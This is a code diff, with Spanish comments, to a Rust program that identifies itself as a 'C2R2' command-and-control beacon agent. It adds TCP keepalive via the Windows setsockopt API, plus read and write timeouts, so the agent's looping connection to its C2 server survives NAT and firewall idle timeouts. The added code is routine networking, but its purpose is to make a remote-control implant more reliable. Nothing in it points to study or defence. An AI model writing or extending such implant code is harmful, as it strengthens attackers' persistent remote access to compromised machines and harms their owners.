@@ -34,6 +34,42 @@ use std::path::Path;
 
 const DELIMITER: &str = "\n<<END>>\n";
 
+/// Configura TCP keepalive para prevenir que la conexión se cierre por inactividad.
+/// Esto es crítico para mantener sesiones estables a través de NAT/firewalls.
+fn configure_tcp_keepalive(stream: &TcpStream) -> std::io::Result<()> {
+    // Configurar keepalive usando APIs de Windows
+    #[cfg(target_os = "windows")]
+    {
+        use std::os::windows::io::AsRawSocket;
+        use winapi::um::winsock2::{setsockopt, SOL_SOCKET, SO_KEEPALIVE};
+        use winapi::shared::ws2def::SOCKET;
+        
+        unsafe {
+            let socket = stream.as_raw_socket() as SOCKET;
+            let keepalive: u32 = 1; // Habilitar keepalive
+            let result = setsockopt(
+                socket,
+                SOL_SOCKET,
+                SO_KEEPALIVE,
+                &keepalive as *const _ as *const i8,
+                std::mem::size_of::<u32>() as i32,
+            );
+            
+            if result != 0 {
+                return Err(std::io::Error::last_os_error());
+            }
+        }
+    }
+    
+    #[cfg(not(target_os = "windows"))]
+    {
+        // En Linux/Unix, el keepalive se puede configurar via setsockopt también
+        // Por ahora, solo retornamos Ok() para non-Windows
+    }
+    
+    Ok(())
+}
+
 fn main() {
     debug_print!("DEBUG: C2R2 Agent v2.0 - Beacon Mode");
     
@@ -59,8 +95,27 @@ fn main() {
     
     loop {
         match TcpStream::connect(config::C2_SERVER) {
-            Ok(stream) => {
+            Ok(mut stream) => {
                 debug_print!("DEBUG: Conectado al servidor C2");
+                
+                // Configurar TCP keepalive para mantener la conexión viva
+                // Esto previene que routers/firewalls cierren conexiones idle
+                if let Err(e) = configure_tcp_keepalive(&stream) {
+                    debug_print!("DEBUG: Warning - No se pudo configurar TCP keepalive: {}", e);
+                }
+                
+                // Configurar timeouts para evitar cuelgues indefinidos
+                let read_timeout = Duration::from_secs(300); // 5 minutos
+                let write_timeout = Duration::from_secs(30);  // 30 segundos
+                
+                if let Err(e) = stream.set_read_timeout(Some(read_timeout)) {
+                    debug_print!("DEBUG: Warning - No se pudo configurar read timeout: {}", e);
+                }
+                
+                if let Err(e) = stream.set_write_timeout(Some(write_timeout)) {
+                    debug_print!("DEBUG: Warning - No se pudo configurar write timeout: {}", e);
+                }
+                
                 retry_count = 0; // Reset retry counter on successful connection
                 handle_connection(stream, &beacon_config);
                 debug_print!("DEBUG: Conexión cerrada");
